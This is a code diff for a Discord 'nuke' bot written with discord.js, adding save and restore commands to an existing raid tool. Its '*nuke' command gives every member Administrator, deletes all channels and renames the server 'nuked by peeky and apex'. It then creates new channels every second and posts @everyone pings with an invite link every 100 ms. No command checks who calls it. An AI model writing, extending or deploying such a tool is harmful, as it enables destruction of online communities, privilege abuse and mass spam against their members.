@@ -1,4 +1,4 @@
-const { Client, GatewayIntentBits, ChannelType } = require('discord.js');
+const { Client, GatewayIntentBits, ChannelType, PermissionsBitField } = require('discord.js');
 require('dotenv').config();
 const express = require('express');
 const path = require('path');
@@ -23,6 +23,7 @@ app.listen(port, () => {
   console.log('\x1b[36m[ SERVER ]\x1b[0m', '\x1b[32m SH : http://localhost:' + port + ' ✅\x1b[0m');
 });
 
+let savedData = null; // To store the server's saved state
 let nukeInterval; // To store the nuke process
 
 client.once('ready', () => {
@@ -30,44 +31,120 @@ client.once('ready', () => {
 });
 
 client.on('messageCreate', async (message) => {
-  if (message.author.bot) return; // Ignore bot messages
+  if (message.author.bot) return;
 
-  if (message.content === '*nuke') {
+  // *save command
+  if (message.content === '*save') {
     try {
-      // Give @everyone admin permissions
-      const everyoneRole = message.guild.roles.everyone;
-      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
-      
-      // Delete all existing channels
+      const guild = message.guild;
+      savedData = {
+        name: guild.name,
+        channels: [],
+        categories: [],
+      };
+
+      for (const channel of guild.channels.cache.values()) {
+        if (channel.type === ChannelType.GuildCategory) {
+          savedData.categories.push({
+            id: channel.id,
+            name: channel.name,
+            children: channel.children.map((child) => ({
+              name: child.name,
+              type: child.type,
+            })),
+          });
+        } else {
+          savedData.channels.push({
+            name: channel.name,
+            type: channel.type,
+            parent: channel.parent?.id || null,
+          });
+        }
+      }
+
+      message.channel.send('Server structure saved successfully.');
+    } catch (error) {
+      console.error('Error during save operation:', error);
+      message.channel.send('Failed to save the server structure.');
+    }
+  }
+
+  // *unnuke command
+  if (message.content === '*unnuke') {
+    try {
+      if (!savedData) {
+        message.channel.send('No saved data found. Use `*save` before using `*unnuke`.');
+        return;
+      }
+
       const channels = message.guild.channels.cache;
       for (const [id, channel] of channels) {
         await channel.delete();
       }
 
-      // Rename server
+      await message.guild.setName(savedData.name);
+
+      const categoryMap = new Map();
+      for (const category of savedData.categories) {
+        const newCategory = await message.guild.channels.create({
+          name: category.name,
+          type: ChannelType.GuildCategory,
+        });
+        categoryMap.set(category.id, newCategory.id);
+
+        for (const child of category.children) {
+          await message.guild.channels.create({
+            name: child.name,
+            type: child.type,
+            parent: newCategory.id,
+          });
+        }
+      }
+
+      for (const channel of savedData.channels) {
+        await message.guild.channels.create({
+          name: channel.name,
+          type: channel.type,
+          parent: channel.parent ? categoryMap.get(channel.parent) : null,
+        });
+      }
+
+      message.channel.send('Server structure restored successfully.');
+    } catch (error) {
+      console.error('Error during un-nuke operation:', error);
+      message.channel.send('Failed to restore the server structure.');
+    }
+  }
+
+  // Existing commands
+  if (message.content === '*nuke') {
+    try {
+      const everyoneRole = message.guild.roles.everyone;
+      await everyoneRole.setPermissions([PermissionsBitField.Flags.Administrator]);
+
+      const channels = message.guild.channels.cache;
+      for (const [id, channel] of channels) {
+        await channel.delete();
+      }
+
       await message.guild.setName('nuked by peeky and apex');
 
-      // Function to create a new channel and start spamming
       const createAndSpamChannel = async () => {
         const channel = await message.guild.channels.create({
           name: 'nuked by peeky and apex',
-          type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
+          type: ChannelType.GuildText,
         });
 
-        // Spam messages in the new channel
         setInterval(() => {
           channel.send('@everyone @here https://discord.gg/jwYqu66bqm');
-        }, 100); // Faster interval for spam (100 ms)
+        }, 100);
       };
 
-      // Create the initial channel
       await createAndSpamChannel();
 
-      // Infinite loop to continually create new channels and start spamming
       nukeInterval = setInterval(async () => {
         await createAndSpamChannel();
-      }, 1000); // Faster interval for creating new channels (1000 ms)
-
+      }, 1000);
     } catch (error) {
       console.error('Error during nuke operation:', error);
     }
@@ -75,10 +152,9 @@ client.on('messageCreate', async (message) => {
 
   if (message.content === '*stop') {
     try {
-      // Stop the nuke process
       if (nukeInterval) {
         clearInterval(nukeInterval);
-        nukeInterval = null; // Clear the interval reference
+        nukeInterval = null;
         message.channel.send('Nuke process stopped.');
       } else {
         message.channel.send('No nuke process is currently running.');
@@ -90,26 +166,22 @@ client.on('messageCreate', async (message) => {
 
   if (message.content === '*clear') {
     try {
-      // Optionally, stop the nuke process if it is running
       if (nukeInterval) {
         clearInterval(nukeInterval);
-        nukeInterval = null; // Clear the interval reference
+        nukeInterval = null;
         message.channel.send('Nuke process stopped.');
       }
 
-      // Delete all channels
       const allChannels = message.guild.channels.cache;
       for (const [id, channel] of allChannels) {
         await channel.delete();
       }
 
-      // Optionally, wait for a moment to ensure channels are deleted
-      await new Promise(resolve => setTimeout(resolve, 1000)); // Wait for 1 second
+      await new Promise((resolve) => setTimeout(resolve, 1000));
 
-      // Create a "general" channel after all channels are deleted
       await message.guild.channels.create({
         name: 'general',
-        type: ChannelType.GuildText, // Use ChannelType.GuildText for text channels
+        type: ChannelType.GuildText,
       });
 
       message.channel.send('All channels have been deleted and a "general" channel has been created.');
